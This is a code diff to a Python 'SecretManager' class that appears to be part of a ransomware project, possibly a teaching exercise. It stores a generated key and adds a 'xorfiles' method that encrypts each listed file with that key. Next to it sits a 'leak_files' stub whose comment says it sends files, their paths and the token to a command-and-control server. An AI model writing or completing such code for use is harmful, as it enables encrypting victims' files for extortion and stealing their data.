@@ -34,12 +34,12 @@ class SecretManager:
 
     def create(self)->Tuple[bytes, bytes, bytes]:
         # Salt and key are randomly generated
-        salt = secrets.token_bytes(self.SALT_LENGTH)
-        key = secrets.token_bytes(self.KEY_LENGTH)
+        self._salt = secrets.token_bytes(self.SALT_LENGTH)
+        self._key = secrets.token_bytes(self.KEY_LENGTH)
         #generate token with do_derivation fuction
-        token=self.do_derivation(salt,key)
+        self._token=self.do_derivation(self._salt, self._key)
 
-        return salt, key, token
+        return self._salt, self._key, self._token
 
 
 
@@ -104,8 +104,9 @@ class SecretManager:
         raise NotImplemented()
 
     def xorfiles(self, files:List[str])->None:
-        # xor a list for file
-        raise NotImplemented()
+        #Go through each file in files and use xorfile function
+        for f in files:
+            xorfile(f,self._key)
 
     def leak_files(self, files:List[str])->None:
         # send file, geniune path and token to the CNC
